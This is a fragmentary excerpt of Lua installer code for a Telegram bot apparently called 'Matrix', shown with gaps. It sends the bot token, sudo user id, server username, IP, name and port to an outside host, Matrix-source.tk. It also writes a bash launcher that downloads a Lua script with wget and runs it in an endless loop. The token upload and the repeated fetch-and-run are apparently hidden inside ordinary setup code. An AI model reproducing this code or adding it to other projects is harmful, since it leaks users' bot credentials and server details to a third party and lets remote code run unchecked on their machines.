...
data,res = https.request("https://Matrix-source.tk/MatrixTeAM/index.php?bn=info&id="..Id)
if res == 200 then
...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://Matrix-source.tk/MatrixTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Matrix::")
local RunBot = io.open("Matrixteam4/Matrixteam-Matrix", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Matrixteam4/Matrixteam-Matrix
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr Matrixteam4/Matrixteam-Matrix.lua
wget "https://raw.githubusercontent.com/Matrixteam4/Matrixteam-Matrix/Matrixteam4/Matrixteam-Matrix/master/Matrixteam4/Matrixteam-Matrix.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Matrixteam4/Matrixteam-Matrix.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Matrixteam4/Matrixteam-Matrix -X kill
screen -S Matrixteam4/Matrixteam-Matrix ./Matrixteam4/Matrixteam-Matrix
done
]])
RunTs:close()
end
